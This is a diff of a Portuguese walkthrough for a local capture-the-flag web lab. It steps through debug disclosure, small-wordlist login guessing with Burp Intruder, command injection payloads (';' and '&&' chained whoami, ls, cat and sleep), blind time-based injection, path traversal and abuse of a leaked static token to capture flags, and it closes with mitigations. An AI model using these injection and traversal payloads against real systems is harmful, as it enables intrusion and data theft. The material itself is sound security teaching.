@@ -4,15 +4,15 @@ Este guia acompanha uma resolucao manual pelo navegador, DevTools e Burp Suite. 
 
 ## 1. Reconhecimento pre-auth e debug disclosure
 
-Abra o navegador em:
+Abra:
 
 ```text
 http://127.0.0.1:8090
 ```
 
-A tela de login nao mostra credenciais. Faca uma tentativa de login qualquer e capture o `POST /api/auth/login` no Burp Proxy ou pelo DevTools Network.
+A tela de login nao mostra credenciais. Faca uma tentativa qualquer e capture o `POST /api/auth/login` no Burp Proxy ou no DevTools Network.
 
-Observe que a requisicao envia campos alem de `username` e `password`. Envie a requisicao para o Burp Repeater e altere o campo `returnUrl` para um valor malformado, como uma aspas simples:
+Observe que a requisicao envia campos alem de `username` e `password`. Envie a request para o Repeater e altere `returnUrl` para uma aspas simples:
 
 ```json
 {
@@ -23,106 +23,53 @@ Observe que a requisicao envia campos alem de `username` e `password`. Envie a r
 }
 ```
 
-A resposta deve ser um `HTTP 500` com um erro de debug do parser de redirect. Esse erro nao e SQL Injection; ele simula um vazamento de stack trace e metadados legados por validacao fraca de parametro client-side.
+A resposta deve ser `HTTP 500` com um erro de debug do parser de redirect. Nao e SQL Injection; e um vazamento de stack trace e paths internos.
 
-No erro, identifique os caminhos expostos:
+No erro, identifique:
 
 ```text
 /old/deployment-notes.txt
 /backup/readme.txt
 ```
 
-Acesse o arquivo de notas legado:
-
-```text
-/old/deployment-notes.txt
-```
-
-Identifique o usuario:
-
-```text
-username: analyst
-```
-
-A nota tambem mostra uma senha temporaria antiga:
-
-```text
-analyst2022
-```
-
-Teste `analyst2022` no login e confirme que falha. O aviso da propria nota diz que ela esta desatualizada e aponta para uma lista candidata arquivada.
-
-Acesse a nota do backup:
-
-```text
-/backup/readme.txt
-```
-
-Esse arquivo indica duas listas pequenas de candidatos:
+Leia `/old/deployment-notes.txt`, encontre `username: analyst`, teste a senha antiga `analyst2022` e confirme que falha. Depois acesse `/backup/readme.txt`, que aponta para:
 
 ```text
 user-candidates.txt
 password-candidates.txt
 ```
 
-Abra ou baixe as listas. Elas foram criadas para validacao controlada dentro do lab local, com poucos usuarios e poucas senhas candidatas. Nao use wordlists grandes, ataques agressivos ou alvos fora do escopo.
+Use Burp Intruder com `Cluster Bomb`:
 
-Use o Burp Intruder com duas posicoes:
+1. Capture um novo `POST /api/auth/login`.
+2. Marque `username` como Payload set 1.
+3. Marque `password` como Payload set 2.
+4. Carregue as duas listas pequenas.
+5. Compare `200` vs `401`, tamanho da resposta e `Login successful`.
 
-1. Use o Proxy para capturar uma tentativa de login.
-2. Envie o `POST /api/auth/login` para o Intruder.
-3. Marque o valor de `username` como primeira posicao.
-4. Marque o valor de `password` como segunda posicao.
-5. Use o tipo de ataque `Cluster Bomb`.
-6. Carregue `user-candidates.txt` como Payload set 1.
-7. Carregue `password-candidates.txt` como Payload set 2.
-8. Inicie o ataque apenas contra o ambiente local.
-9. Compare status code, tamanho da resposta e mensagem.
+Se voce ja validou o usuario `analyst`, tambem pode fixar o username e testar apenas a wordlist de senhas.
 
-O corpo fica conceitualmente assim:
-
-```json
-{
-  "username": "§user§",
-  "password": "§password§",
-  "client": "web",
-  "returnUrl": "/dashboard.html"
-}
-```
-
-Alternativa: se voce ja validou o usuario `analyst` nas notas de deployment, mantenha `username` fixo como `analyst` e use o Intruder apenas no campo `password`.
-
-A tentativa correta retorna `200` e a mensagem:
-
-```text
-Login successful
-```
-
-Antes de seguir para o painel, volte a nota de deployment. Ela menciona a revisao de acesso arquivada em:
-
-```text
-/old/access-review.txt
-```
-
-Esse arquivo fecha a superficie pre-auth com:
-
-```text
-FLAG{pre_auth_debug_disclosure_lab3}
-```
-
-Use a credencial encontrada para entrar:
+A combinacao correta e:
 
 ```text
 analyst:analyst123
 ```
 
-O login nao e SQL Injection e nao depende de brute force pesado. Esta etapa e uma fase inicial de information disclosure com validacao manual controlada.
+Antes de entrar no painel, volte as notas antigas. A linha `Access review note: access-review.txt` aponta para:
 
-## 2. Dashboard e reconhecimento da aplicacao
+```text
+/old/access-review.txt
+```
 
-Observe os cards de ativos, os hostnames, os status e o historico recente. Clique em `Verificar` em um ativo e veja o resultado tecnico mostrado na tela.
+Flag:
 
-Abra DevTools Network ou configure o Burp Proxy e repita a verificacao. A chamada importante e um `POST /api/assets/check`. No corpo JSON, procure:
+```text
+FLAG{pre_auth_debug_disclosure_lab3}
+```
+
+## 2. Dashboard e request tampering
+
+Depois do login, clique em `Verificar` em qualquer ativo. Capture o `POST /api/assets/check`:
 
 ```json
 {
@@ -132,108 +79,103 @@ Abra DevTools Network ou configure o Burp Proxy e repita a verificacao. A chamad
 }
 ```
 
-O detalhe central e que `target` nao e editavel na UI, mas e enviado pelo cliente.
+`target` nao e editavel na UI, mas chega do cliente ao backend. A falha nao pertence a um card especifico: qualquer card usa a mesma feature de check.
 
-Esse endpoint tem dois modos vulneraveis:
+## 3. Command Injection com output
 
-- `checkType: "icmp"` usa a verificacao com ping e retorna output. Esse modo permite Command Injection com retorno visivel.
-- `checkType: "tcp"` usa uma verificacao TCP e retorna apenas metadados, incluindo `durationMs`. Esse modo e usado para Blind/Time-Based Command Injection.
+No Repeater, altere apenas `target`.
 
-A falha nao pertence ao card Gateway Edge em si. Todos os cards usam a mesma funcionalidade de verificacao. O ponto vulneravel e o backend confiar em `target` e, no modo TCP, tambem em `port`, enviados pelo cliente. Qualquer card que use a feature de check pode ser explorado se voce alterar a request no Burp.
-
-## 3. Request tampering
-
-Envie a requisicao para o Burp Repeater. Antes de tentar qualquer exploracao, altere campos com cuidado e mantenha a estrutura JSON valida.
-
-O risco aqui e o backend confiar em um alvo tecnico vindo do navegador. Se o servidor usa `target` diretamente, o usuario pode mudar a operacao executada sem que a tela ofereca um campo para isso.
-
-## 4. Command Injection com output
-
-No Repeater, altere `target` para um teste inofensivo:
+Confirme execucao:
 
 ```text
 127.0.0.1; whoami
 ```
 
-Se a resposta incluir a saida desse comando, voce confirmou execucao de comando com output visivel. Essa etapa nao deve retornar flag automaticamente; ela e apenas uma prova de impacto.
-
-Agora faca uma enumeracao basica e controlada do ambiente, sem comandos destrutivos. Primeiro entenda o diretorio atual:
+Entenda o contexto:
 
 ```text
 127.0.0.1; pwd
-```
-
-Liste arquivos e diretorios proximos:
-
-```text
 127.0.0.1; ls -la
 127.0.0.1; ls -la /app
+127.0.0.1; ls -la /app/flags
 ```
 
-Procure arquivos de interesse com profundidade limitada:
-
-```text
-127.0.0.1; find /app -maxdepth 3 -type f 2>/dev/null
-```
-
-Esse fluxo simula pos-exploracao basica e enumeracao de filesystem dentro do container local. Depois de identificar a evidencia, leia o arquivo encontrado:
+Depois leia a evidencia da superficie:
 
 ```text
 127.0.0.1; cat /app/flags/flag1.txt
 ```
 
-## 5. Blind/Time-Based Command Injection
+Flag:
 
-Nem toda command injection retorna stdout ou stderr. Use a mesma requisicao `POST /api/assets/check` para testar um modo sem output visivel.
+```text
+FLAG{command_injection_ping_lab3}
+```
 
-No Burp Repeater, troque o corpo para um check TCP normal:
+## 4. Blind/Time-Based Command Injection no agente
+
+Abra `/js/app.js` ou leia pistas dos logs. Ha um endpoint sem botao na UI:
+
+```text
+/api/agents/tcp-probe
+```
+
+Monte manualmente:
+
+```http
+POST /api/agents/tcp-probe
+Content-Type: application/json
+Cookie: session=...
+```
 
 ```json
 {
-  "assetId": "gw-01",
-  "checkType": "tcp",
   "target": "127.0.0.1",
   "port": "80"
 }
 ```
 
-Observe `durationMs`. Depois altere apenas o alvo:
+O endpoint retorna apenas metadados. Para validar a injecao por tempo:
 
-```text
-127.0.0.1; sleep 5; #
+```json
+{
+  "target": "127.0.0.1; sleep 5; #",
+  "port": "80"
+}
 ```
 
-Compare o tempo de resposta e o `durationMs`. Um atraso de aproximadamente 5 segundos confirma execucao por canal de tempo, mesmo sem stdout/stderr. Essa etapa confirma blind command injection; ela nao captura flag automaticamente.
+Compare o tempo da resposta e `durationMs`. A flag nao aparece no JSON.
 
-Para transformar essa execucao cega em um efeito observavel seguro, copie a flag time-based para um arquivo publico e mantenha o atraso:
+Para gerar um efeito colateral seguro:
 
-```text
-127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #
+```json
+{
+  "target": "127.0.0.1; cp /app/flags/flag_time.txt /app/public/reports/tcp-proof.txt; sleep 5; #",
+  "port": "80"
+}
 ```
 
-O modo TCP continua sem devolver stdout/stderr. A confirmacao aparece fora da resposta original, acessando:
+Depois acesse:
 
 ```text
 http://127.0.0.1:8090/reports/tcp-proof.txt
 ```
 
-Resultado esperado:
+Flag:
 
 ```text
 FLAG{blind_time_based_command_injection_lab3}
 ```
 
-## 6. Inspecao do JavaScript
+## 5. Resolver legado e metadata disclosure
 
-Abra DevTools Sources ou acesse `/js/app.js` no navegador. Procure referencias discretas, nao links de menu.
+No JavaScript, procure:
 
-Voce deve notar pistas para um resolver legado e para `support.html`. Trate isso como descoberta: esses fluxos existem no codigo, mas nao aparecem como botoes principais da aplicacao.
+```text
+/api/assets/resolve
+```
 
-## 7. Resolver legado e filtro fraco
-
-Monte manualmente no Burp Repeater uma nova requisicao para o resolver legado descoberto no JavaScript. Ele nao esta na UI e nao usa o mesmo body de `/api/assets/check`.
-
-Comece com a estrutura minima:
+Tambem ha uma pista de formato de payload com `target`. Monte:
 
 ```http
 POST /api/assets/resolve
@@ -243,81 +185,77 @@ Cookie: session=...
 
 ```json
 {
-  "target": "localhost"
+  "target": "dns01.local"
 }
 ```
 
-Depois teste se `;` e bloqueado:
+Teste targets vistos no dashboard, como `gateway.local`, `dns01.local`, `intranet.local` e `backup01.local`. O endpoint devolve metadados internos de resolucao.
+
+Em `app.log`, procure a pista:
+
+```text
+legacy resolver still accepts internal metadata target for support checks
+```
+
+Teste:
 
 ```json
 {
-  "target": "localhost; whoami"
+  "target": "internal-metadata"
 }
 ```
 
-Compare com um operador permitido, como `&&`, usando um comando inofensivo:
+ou:
 
 ```json
 {
-  "target": "localhost && id"
+  "target": "metadata"
 }
 ```
 
-Para capturar a segunda flag:
+Flag:
 
-```json
-{
-  "target": "localhost && cat /app/flags/flag2.txt"
-}
+```text
+FLAG{hidden_resolver_metadata_disclosure_lab3}
 ```
 
-A etapa continua sendo Command Injection, mas o foco didatico muda para weak filtering/bypass: a aplicacao bloqueia apenas `;` e deixa `&&` passar.
+## 6. Support diagnostics e Path Traversal
 
-## 8. Support diagnostics escondido
-
-A partir das pistas no HTML/JS, acesse `support.html`. Ela nao estava no menu principal.
-
-Use o campo `Log file` para abrir `app.log`. Esse campo chama:
+No JS, encontre `support.html` e abra a pagina. O campo `Log file` usa:
 
 ```text
 /api/support/log?file=app.log
 ```
 
-Leia o arquivo como log operacional e procure:
+Leia `app.log`. Ele aponta para:
 
-- endpoint interno;
-- header esperado;
-- token dividido em partes;
-- rotas internas de diagnostics e backup;
-- evidencia fora do diretorio de dados.
+```text
+[debug] archived incident review details moved to audit.log
+```
 
-## 9. Path Traversal
+Abra `audit.log` no mesmo viewer. Ele revela:
 
-O campo `Log file` chama `/api/support/log?file=app.log`, o que sugere que o backend le arquivos a partir de um diretorio base, como `/app/data`. O proprio `app.log` diz que a evidencia foi movida para fora do data directory.
+```text
+[review] incident evidence moved outside data directory
+[review] evidence relative hint: flags/flag4.txt
+[review] log viewer base directory: /app/data
+```
 
-Ao usar:
+Se a base e `/app/data`, use traversal:
 
 ```text
 ../flags/flag4.txt
 ```
 
-o caminho efetivo fica como `/app/data/../flags/flag4.txt`, que resolve para `/app/flags/flag4.txt`.
-
-Use traversal para ler:
-
-```text
-../flags/flag4.txt
-```
-
-A causa raiz e aceitar entrada do usuario em `path.join` sem garantir que o caminho final permaneceu dentro do diretorio permitido. Essa superficie agora possui uma unica flag principal:
+Flag:
 
 ```text
 FLAG{path_traversal_log_viewer_lab3}
 ```
 
-## 10. Token interno e Broken Access Control
+## 7. Token interno, Broken Access Control e diagnostics
 
-Os logs mostram:
+Ainda em `app.log`, monte o token:
 
 ```text
 support token prefix: netaudit
@@ -325,93 +263,97 @@ support token middle: debug
 support token suffix: 2026
 ```
 
-Logo, o token montado e:
+Resultado:
 
 ```text
 netaudit-debug-2026
 ```
 
-No Burp Repeater, chame `/api/internal/health` enviando:
+Sem header, `/api/internal/health` retorna `403`. Com:
 
 ```text
 X-Support-Token: netaudit-debug-2026
 ```
 
-Sem token, a resposta deve ser `403`. Com token, o healthcheck retorna metadados. Ele nao retorna flag diretamente, mas revela:
+o health revela:
 
 ```text
 diagnosticEndpoint: /api/internal/diagnostics
 backupEndpoint: /api/internal/backup
+backupMethod: POST
+requiredParameter: includeFile
 ```
 
-Chame o endpoint de diagnostics com o mesmo header:
+Chame:
 
 ```text
 GET /api/internal/diagnostics
 X-Support-Token: netaudit-debug-2026
 ```
 
-Ele retorna a flag dessa superficie interna:
+Resposta importante:
 
 ```text
 FLAG{internal_diagnostics_token_abuse_lab3}
+backupManifest: /app/data/backup-manifest.log
 ```
 
-## 11. Backup command injection
+## 8. Backup interno com Arbitrary File Read
 
-O health interno revela:
-
-```text
-backupEndpoint: /api/internal/backup
-method: POST
-requiredParameter: archiveName
-```
-
-Portanto, se voce acessar `/api/internal/backup` via `GET`, receber `404` ou erro e esperado. A requisicao correta precisa ser `POST`, usando o header `X-Support-Token`.
-
-Teste primeiro um body normal:
+O health ja informou que o backup usa `POST` e `includeFile`. Use primeiro um arquivo normal:
 
 ```json
 {
-  "archiveName": "backup.tar.gz"
+  "includeFile": "data/app.log"
 }
 ```
 
-Depois explore `archiveName`:
+Depois leia o manifesto indicado pelo diagnostics:
 
 ```json
 {
-  "archiveName": "backup.tar.gz; cat /app/flags/root.txt"
+  "includeFile": "data/backup-manifest.log"
 }
 ```
 
-Esse body le:
+Ele mostra:
 
 ```text
-/app/flags/root.txt
+[backup] final proof file: flags/root.txt
 ```
 
-Essa e uma command injection em uma funcao administrativa exposta por metadados internos.
+Entao leia:
 
-## 12. Mitigacoes
+```json
+{
+  "includeFile": "flags/root.txt"
+}
+```
+
+Flag final:
+
+```text
+FLAG{admin_backup_arbitrary_file_read_lab3}
+```
+
+## 9. Mitigacoes
 
 Mitigacoes principais:
 
 - nao usar `exec` com concatenacao;
-- usar `execFile` ou `spawn` com argumentos separados;
-- validar `checkType` por allowlist;
-- validar `target` como IP ou hostname esperado;
-- validar `port` como numero dentro do intervalo permitido;
-- nao confiar em campos enviados pelo cliente;
-- nao expor endpoints internos;
-- nao usar token estatico;
-- nao vazar token em logs;
-- validar acesso a arquivos com allowlist e checagem de base directory.
+- separar endpoints administrativos de fluxos comuns;
+- validar destinos e portas com allowlists;
+- nao expor metadata de suporte sem necessidade;
+- nao vazar stack traces e paths internos;
+- nao publicar listas de credenciais;
+- validar nomes de arquivo por allowlist e caminho resolvido;
+- nao confiar em token estatico vazado em logs;
+- aplicar autenticacao e autorizacao reais para endpoints internos.
 
 ## Dicas progressivas
 
-1. Se a UI nao deixa editar um valor, olhe o JSON da requisicao.
-2. Se uma resposta nao mostra output, compare tempos de resposta.
-3. Comentarios HTML e constantes JS podem revelar fluxos sem link visivel.
-4. Logs operacionais raramente deveriam conter segredos ou rotas internas.
-5. Blacklist de caractere unico costuma deixar bypasses simples.
+1. Se a UI nao mostra um valor editavel, olhe a requisicao capturada.
+2. Se nao existe output, compare tempo e efeitos colaterais.
+3. Comentarios, constantes JS e logs podem revelar fluxos sem link.
+4. Metadata de suporte tambem pode ser sensivel.
+5. Se uma funcionalidade le arquivos, pense na base usada pelo backend.
